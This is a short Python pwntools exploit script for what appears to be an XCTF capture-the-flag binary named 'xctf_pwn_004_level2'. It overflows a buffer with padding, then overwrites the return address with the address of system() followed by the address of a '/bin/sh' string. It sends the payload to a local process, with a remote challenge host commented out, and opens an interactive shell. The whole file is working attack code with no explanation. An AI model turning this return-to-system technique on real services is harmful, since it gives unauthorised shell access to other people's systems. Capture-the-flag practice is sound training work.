from pwn import *
from zzPwnlib import *
context(os='linux', arch='amd64', log_level='debug')

#r = remote('111.200.241.244',49449)
r = process('./xctf_pwn_004_level2')

system_addr = 0x8048320
binsh_addr  = 0x804A024

payload  = payloadBase(0x88, 32)
payload += p32(system_addr)
payload += b"_ret"
payload += p32(binsh_addr)
payload  = payload.ljust(0x100, b"B")

r.recv()
r.send(payload)

r.interactive()
